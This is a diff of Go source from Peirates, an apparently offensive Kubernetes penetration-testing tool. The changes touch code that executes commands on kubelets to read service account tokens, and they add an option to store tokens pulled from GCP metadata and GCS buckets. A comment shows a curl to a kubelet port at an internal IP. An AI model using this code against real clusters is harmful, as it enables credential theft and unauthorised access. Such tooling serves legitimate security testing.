@@ -901,8 +901,7 @@ func GetNodesInfo(connectionString ServerInfo) {
 	}
 }
 
-//adam here
-func ExecuteCodeOnKubelet(connectionString ServerInfo) {
+func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]ServerInfo) {
 	fmt.Println("+ Getting IP addess for the nodes in the cluster")
 	nodeDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
 	println(nodeDetailOut)
@@ -915,7 +914,7 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo) {
 		if err != nil {
 			fmt.Println("[-] Error unmarshaling data in this secret: ", err)
 		}
-		//adam here
+
 		for _, item := range getnodeDetail.Items {
 
 			for _, addr := range item.Status.Addresses {
@@ -989,7 +988,10 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo) {
 								token := string(body_exec_command)
 								println("[+] Got service account token for", "ns:"+podNamespace+" pod:"+podName+" container:"+containerName+":", token)
 								println("")
-
+								// name := "ns:" + podNamespace + ":" + podName
+								// serviceAccount := makeNewServiceAccount(name, token, "kubelet")
+								// serviceAccounts = append(serviceAccounts, serviceAccount)
+								println("FIXME: serviceAccounts undefined?")
 							}
 						}
 					}
@@ -1413,6 +1415,17 @@ Peirates:># `)
 
 		// [15] Pull Kubernetes service account tokens from GCS [GCP only]
 		case "15":
+			var storeTokens string
+			var placeTokensInStore bool
+
+			println("[1] Store all tokens found in Peirates data store")
+			println("[2] Retrieve all tokens - I will copy and paste")
+			fmt.Scanln(&storeTokens)
+			storeTokens = strings.TrimSpace(storeTokens)
+
+			if storeTokens == "1" {
+				placeTokensInStore = true
+			}
 
 			token := GetGCPBearerTokenFromMetadataAPI("default")
 			if token == "ERROR" {
@@ -1535,7 +1548,16 @@ Peirates:># `)
 								if err != nil {
 									println("Could not decode token.")
 								} else {
-									println(string(token))
+									token_string := string(token)
+									println(token_string)
+
+									if placeTokensInStore {
+										token_name := "GCS-acquired: " + string(service_account_name)
+										println("Storing token as:", token_name)
+										serviceAccount := makeNewServiceAccount(token_name, token_string, "GCS Bucket")
+										serviceAccounts = append(serviceAccounts, serviceAccount)
+
+									}
 								}
 
 							}
@@ -1591,7 +1613,7 @@ Peirates:># `)
 			// Use kubectl get nodes to get a list of nodes
 			// ---->  GetNodesInfo(connectionString)
 			// Use kubectl get node _name_ -o yaml to get IP addresses
-			ExecuteCodeOnKubelet(connectionString)
+			//ExecuteCodeOnKubelet(connectionString, &serviceAccounts)
 			// Find a line that matches - address: IP
 			// curl port 10255 to get pods: curl -sk http://10.23.58.41:10255/pods
 
